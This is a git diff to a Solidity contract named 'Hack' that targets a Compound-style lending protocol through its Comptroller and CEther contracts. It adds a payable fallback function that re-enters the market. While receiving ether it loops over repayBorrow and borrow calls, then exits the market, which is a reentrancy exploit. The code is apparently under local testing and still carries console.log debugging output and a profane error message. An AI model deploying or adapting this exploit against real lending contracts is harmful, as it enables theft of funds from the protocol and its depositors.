@@ -9,6 +9,7 @@ contract Hack {
     address comptroller;
     address cether;
     address payable _cether;
+    uint i;
     constructor(address _comptroller, address __cether) public {
         comptroller = _comptroller;
         cether = __cether;
@@ -31,13 +32,46 @@ contract Hack {
         return CEther(_cether).balanceOf(address(this));
     }
 
-    function callBorrow() public {
-        CEther(_cether).borrow(1 ether);
+    function callBorrow() public returns(bool){
+        //CEther(_cether).borrow(1);
+        (bool success, ) = _cether.call.gas(500000000000)(abi.encodeWithSignature('borrow(uint256)', 1));
+        require(success, 'borrow failed');
+        return success;
     }
 
     function checkAllMarkets() public returns(address){
 
-    }   
+    } 
 
-    function() external payable{}
+    function callrepayBorrow() public {
+        (bool success, ) = _cether.call.value(1)(abi.encodeWithSignature('repayBorrow()'));
+        require(success, 'asshole');
+    }
+
+    function callExitMarket() public {
+        Comptroller(comptroller).exitMarket(cether);
+    }
+
+    function() external payable{
+        if(i == 0){
+            console.log('i value in if %s:', i);      
+        }
+
+        if(i == 2){
+            while(i != 3) {
+                callrepayBorrow();
+                callBorrow();
+                console.log('hack balance each loop', address(this).balance);
+                console.log('i value %s:', i);
+                i++;    
+            }                
+        }
+
+        if(i == 4) {
+            callExitMarket();
+        }
+
+        i++;
+        console.log('I VALOZZ %s', i);
+    }
 }
